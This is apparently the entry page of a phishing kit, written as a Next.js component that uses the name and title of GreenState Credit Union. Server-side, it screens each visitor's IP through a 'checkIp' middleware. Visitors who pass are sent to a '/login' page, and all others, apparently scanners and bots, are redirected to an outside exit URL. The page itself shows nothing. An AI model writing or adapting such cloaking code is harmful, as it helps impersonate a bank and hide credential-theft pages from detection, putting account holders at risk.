import MobileDetect from "mobile-detect";
import type { GetServerSideProps, NextPage } from "next";
import Head from "next/head";
import checkIp from "../middleware/checkIp";

const index: NextPage<{ isBot: boolean }> = ({ isBot }) => {
  if (isBot) {
    return <div />;
  }

  return (
    <>
      <Head>
        <title>GreenState Credit Union</title>
        <link href="/favicon.ico" />
      </Head>
      <div />
    </>
  );
};

export const getServerSideProps: GetServerSideProps = async ({ req }) => {
  const { valid } = await checkIp(req);

  return {
    props: { isBot: valid },
    redirect: {
      destination: valid ? "/login" : process.env.NEXT_PUBLIC_EXIT_URL,
      permanent: false,
    },
  }
};

export default index;
